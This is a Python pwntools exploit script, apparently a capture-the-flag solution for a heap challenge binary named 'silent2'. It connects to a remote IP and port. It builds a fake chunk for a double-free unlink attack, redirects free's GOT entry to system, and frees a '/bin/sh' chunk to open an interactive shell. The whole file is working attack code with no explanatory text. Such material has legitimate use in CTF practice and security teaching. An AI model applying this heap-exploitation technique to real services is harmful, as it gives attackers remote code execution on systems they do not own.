#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./silent2")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./silent2")
    libc = elf.libc


else:
    io = remote("39.107.32.132", 10001)
    #  libc = ELF("")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, "set follow-fork-mode parent\n" + cmd)

def create(size, content):
    io.sendline("1")
    io.sendline(str(size))
    io.send(content)

def delete(idx):
    io.sendline("2")
    io.sendline(str(idx))

def edit(idx, content):
    io.sendline("3")
    io.sendline(str(idx))
    io.send(content)

if __name__ == "__main__":
    create(0x90,'0' * 0x8f)
    create(0x90,'/bin/sh\x00')
    create(0x90,'2' * 0x8f)
    create(0x90,'3' * 0x8f)
    create(0xa0,'4' * 0x9f)
    create(0x100,'5' * 0xff)

    # double-free-unlink
    delete(3)
    delete(4)

    payload = p64(0)+p64(0)
    payload += p64(0x6020d8-0x18) + p64(0x6020d8-0x10)
    payload = payload.ljust(0x90)
    payload += p64(0x90) + p64(0xb0)
    #  DEBUG("b * 0x4009DC\nc")
    create(0x140,payload)
    delete(4)
    # Spawn Shell
    edit(3,p64(elf.got['free']))
    edit(0,p64(elf.plt['system']))
    delete(1)


    io.interactive()
    io.close()



